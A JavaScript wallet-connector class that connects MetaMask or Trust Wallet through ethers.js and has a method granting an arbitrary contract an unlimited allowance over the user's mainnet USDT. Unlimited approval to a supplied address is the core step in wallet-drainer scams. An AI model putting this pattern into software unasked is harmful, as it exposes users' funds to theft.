class WalletConnector {
    constructor() {
        this.provider = null;
        this.signer = null;
        this.walletAddress = null;
    }

    async detectWallet() {
        if (typeof window.ethereum !== 'undefined') {
            return 'metamask';
        } else if (typeof window.trustwallet !== 'undefined') {
            return 'trustwallet';
        } else {
            return null;
        }
    }

    async connect() {
        try {
            if (typeof window.ethereum === 'undefined') {
                throw new Error('No Ethereum wallet found. Please install MetaMask or Trust Wallet.');
            }

            // Request account access
            const accounts = await window.ethereum.request({
                method: 'eth_requestAccounts'
            });

            this.walletAddress = accounts[0];
            
            // Create provider and signer
            this.provider = new ethers.providers.Web3Provider(window.ethereum);
            this.signer = this.provider.getSigner();

            return {
                success: true,
                address: this.walletAddress
            };
        } catch (error) {
            return {
                success: false,
                error: error.message || 'Failed to connect wallet'
            };
        }
    }

    async approveContract(contractAddress) {
        try {
            if (!this.signer) {
                throw new Error('Wallet not connected');
            }
            
            // USDT contract address (replace with your actual USDT contract)
            const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // Mainnet USDT
            
            const usdtContract = new ethers.Contract(
                usdtContractAddress,
                ['function approve(address spender, uint256 amount) public returns (bool)'],
                this.signer
            );

            const tx = await usdtContract.approve(
                contractAddress,
                ethers.constants.MaxUint256
            );

            await tx.wait();

            return {
                success: true,
                txHash: tx.hash
            };
        } catch (error) {
            return {
                success: false,
                error: error.message || 'Failed to approve contract'
            };
        }
    }
}

export default WalletConnector;
